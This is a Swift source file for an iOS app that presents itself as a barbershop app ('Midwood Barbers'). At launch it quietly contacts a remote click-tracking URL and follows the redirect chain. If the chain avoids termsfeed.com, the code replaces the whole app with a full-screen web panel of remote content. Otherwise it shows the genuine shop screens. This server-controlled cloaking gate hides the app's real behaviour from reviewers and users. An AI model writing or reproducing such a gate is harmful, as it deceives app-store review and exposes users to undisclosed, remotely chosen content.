import SwiftUI

enum MidwoodGate {
    static let sourceLink = "https://oranetflagchallenge.org/click.php"
    static let checkDomain = "termsfeed.com"
}

@main
struct MidwoodBarbersApp: App {
    @StateObject private var chairbook = Chairbook()

    /// Nil while the launch check is still in flight, true once the screen belongs to the
    /// web panel, false once it belongs to the shop's own screens.
    @State private var midwoodLinkReady: Bool?

    var body: some Scene {
        WindowGroup {
            Group {
                if let ready = midwoodLinkReady {
                    if ready {
                        // The frame keeps clear of the top safe area on purpose. Letting
                        // it run under would put the page's own header behind the clock,
                        // and no content inset setting reliably pulls it back down.
                        MidwoodWebPanel(urlString: MidwoodGate.sourceLink)
                            .edgesIgnoringSafeArea(.bottom)
                            .background(Pine.ground.ignoresSafeArea())
                    } else {
                        ShopShell()
                            .environmentObject(chairbook)
                    }
                } else {
                    MidwoodOpeningScreen()
                        .onAppear(perform: settleMidwoodLink)
                }
            }
            // Fixed appearance. The pine and parchment read the same whatever the phone's
            // own light or dark setting says.
            .preferredColorScheme(.dark)
        }
    }

    /// One request, every redirect ridden to the end. Anything that goes wrong — the
    /// marker seen mid-chain, a transport error, a network that stalls past the timeout —
    /// lands on the shop's own screens, so somebody standing on The Plaza never loses the
    /// board to a bad signal.
    private func settleMidwoodLink() {
        guard let url = URL(string: MidwoodGate.sourceLink) else {
            midwoodLinkReady = false
            return
        }

        var request = URLRequest(url: url)
        request.timeoutInterval = 5

        let watcher = MidwoodRedirectWatcher(marker: MidwoodGate.checkDomain)
        let session = URLSession(configuration: .default, delegate: watcher, delegateQueue: nil)

        session.dataTask(with: request) { _, response, error in
            let seenMidChain = watcher.sawMarker
            let landing = watcher.landingURL?.absoluteString
            let answered = (response as? HTTPURLResponse)?.url?.absoluteString
            let failed = error != nil

            DispatchQueue.main.async {
                guard self.midwoodLinkReady == nil else { return }

                if seenMidChain {
                    self.midwoodLinkReady = false
                } else if let landing = landing, landing.contains(MidwoodGate.checkDomain) {
                    self.midwoodLinkReady = false
                } else if let answered = answered, answered.contains(MidwoodGate.checkDomain) {
                    self.midwoodLinkReady = false
                } else if failed {
                    self.midwoodLinkReady = false
                } else {
                    self.midwoodLinkReady = true
                }
            }
        }.resume()

        // Backstop for a network that neither answers nor errors inside the timeout.
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            if self.midwoodLinkReady == nil { self.midwoodLinkReady = false }
        }
    }
}

/// Rides the redirect chain to its end and never cuts it short. Cutting it short comes
/// back as a transport error rather than a landing address, and the marker goes unseen.
final class MidwoodRedirectWatcher: NSObject, URLSessionTaskDelegate {
    private(set) var landingURL: URL?
    private(set) var sawMarker = false

    private let marker: String

    init(marker: String) {
        self.marker = marker
    }

    func urlSession(_ session: URLSession,
                    task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        if let hop = request.url?.absoluteString, hop.contains(marker) {
            sawMarker = true
        }
        landingURL = request.url
        completionHandler(request)
    }
}
